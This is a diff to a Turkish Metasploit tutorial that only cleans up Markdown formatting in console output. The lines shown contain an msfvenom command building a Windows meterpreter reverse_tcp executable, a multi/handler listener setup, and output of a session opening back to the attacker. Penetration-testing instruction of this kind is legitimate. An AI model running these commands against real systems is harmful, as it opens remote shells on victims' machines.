@@ -52,7 +52,7 @@ Yukarıda belirtilen kuralları göz önünde bulundurarak, hedefe özel script 
 root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST**=**192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
 Found 10 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 326 **(**iteration**=**0**)**
+x86/shikata_ga_nai succeeded with size 326 (iteration**=**0)
 x86/shikata_ga_nai chosen with final size 326
 Payload size: 326 bytes
 Saved as: Meterpreter.exe
@@ -100,11 +100,11 @@ root@kali:~# msfconsole -r meterpreter.rc
 
 resource> use exploit/multi/handler
 resource> set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD **=>** windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
 resource> set LHOST 192.168.1.184
-LHOST **=>** 192.168.1.184
+LHOST => 192.168.1.184
 resource> set ExitOnSession false
-ExitOnSession **=>** false
+ExitOnSession => false
 resource> exploit -j -z
 > Handler binding to LHOST 0.0.0.0
 > Started reverse handler
@@ -117,10 +117,10 @@ Yukarıda gördüğünüz gibi Metasploit Framework dinleme yaparak başlamışt
 
 
 ```bash
-> Sending stage **(**718336 bytes**)**
-> Meterpreter session 1 opened **(**192.168.1.158:4444 -> 192.168.1.104:1043**)**
+> Sending stage (718336 bytes)
+> Meterpreter session 1 opened (192.168.1.158:4444 -> 192.168.1.104:1043)
 
-msf exploit**(**handler**)** > sessions -i 1
+msf exploit(handler) > sessions -i 1
 > Starting interaction with 1...
 
 meterpreter >```
